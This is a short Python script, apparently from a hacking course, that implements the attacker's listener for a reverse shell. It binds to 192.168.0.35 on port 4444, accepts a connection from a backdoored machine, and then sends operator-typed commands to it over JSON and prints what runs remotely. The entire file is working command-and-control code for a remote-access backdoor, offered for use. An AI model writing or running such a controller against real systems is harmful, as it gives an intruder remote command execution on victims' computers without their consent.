import socket, json

class Listener:
    def __init__(self,ip, port ):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #modify an option so we can reuse sockets
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        #bind socket to computer to listen for connections on port 4444
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        # returns 2 values - socket object that represents the option that we can use to send or receive data
        # 2nd object - address bound to the connection
        self.connection, address =  listener.accept()
        print("[+] Got a connection from" + str(address))

    def reliable_send(self,data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode('utf-8'))

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)

        if command[0] == "exit":
            self.connection.close()
            exit()
        # Receive and decode the result from bytes to string
        return self.reliable_receive()

    def run(self):
        while True:
            command = input(">> ").split(" ")
            result = self.execute_remotely(command)
            print(result)

my_listener = Listener("192.168.0.35", 4444)
my_listener.run()
